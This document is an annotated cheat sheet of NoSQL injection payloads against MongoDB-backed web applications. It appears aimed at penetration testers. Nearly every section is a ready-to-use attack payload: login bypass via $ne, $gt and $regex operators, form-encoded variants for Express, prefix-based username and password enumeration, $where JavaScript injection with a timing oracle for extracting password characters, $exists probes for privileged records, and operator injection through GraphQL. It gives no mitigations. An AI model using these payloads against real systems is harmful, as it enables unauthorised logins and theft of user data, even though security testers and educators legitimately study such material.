# NoSQL Injection — Annotated Payload Examples

## Authentication Bypass

### $ne operator (most common)
```json
{"username": "admin", "password": {"$ne": "invalid"}}
```
Executes: `db.users.findOne({username:"admin", password:{$ne:"invalid"}})` — matches any user where password ≠ "invalid".

### $gt operator
```json
{"username": "admin", "password": {"$gt": ""}}
```
Matches any document where password > "" — true for all non-empty passwords.

### $regex bypass
```json
{"username": "admin", "password": {"$regex": ".*"}}
```
Matches any password string.

### Username wildcard (login as any user)
```json
{"username": {"$regex": ".*"}, "password": {"$ne": "x"}}
```

---

## Form-Encoded Variants

```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$ne]=x
```
Works when server uses `qs` parser (Node.js default for `express.urlencoded`).

---

## Enumeration via $regex

### Username enumeration
```json
{"username": {"$regex": "^a"}, "password": {"$ne": "x"}}
{"username": {"$regex": "^ad"}, "password": {"$ne": "x"}}
{"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}
```
Binary search via prefix — 200 OK = prefix matches a real username.

### Password enumeration (once username confirmed)
```json
{"username": "admin", "password": {"$regex": "^[a-f0-9]{32}$"}}
```
Tests if password is a 32-char hex string (MD5 hash).

---

## $where JavaScript Injection

### Simple condition
```json
{"$where": "this.username == 'admin'"}
```

### Time-based blind (confirm JS execution)
```json
{"$where": "function(){var t=new Date(); while(new Date()-t<3000){} return true;}"}
```
If response delays ~3 seconds: `$where` JS is executing.

### Data extraction via timing (character oracle)
```json
{"$where": "function(){if(this.password[0]=='a'){sleep(3000);} return true;}"}
```

---

## Array and $in Operators

### Multi-value probe
```json
{"username": {"$in": ["admin", "administrator", "root", "superuser"]}}
```

### $exists — field presence oracle
```json
{"filter": {"adminToken": {"$exists": true}}}
{"filter": {"internalNotes": {"$exists": true}}}
```
Returns documents that have the field — enumerates privileged records.

---

## $where — Server-Side JS

```json
{"filter": {"$where": "this.role == 'admin'"}}
{"filter": {"$where": "this.email.match(/@target-internal\\.com$/)"}}
```

---

## GraphQL with MongoDB Backend

```graphql
# Inject operator into input scalar
{ users(filter: { role: { $ne: "user" } }) { email role adminToken } }
```

```graphql
# $regex enumeration via GraphQL variable
query Users($pattern: String!) {
  users(filter: { username: { $regex: $pattern } }) { id email }
}
```
Variables: `{"pattern": "^admin"}` — true if admin account found.
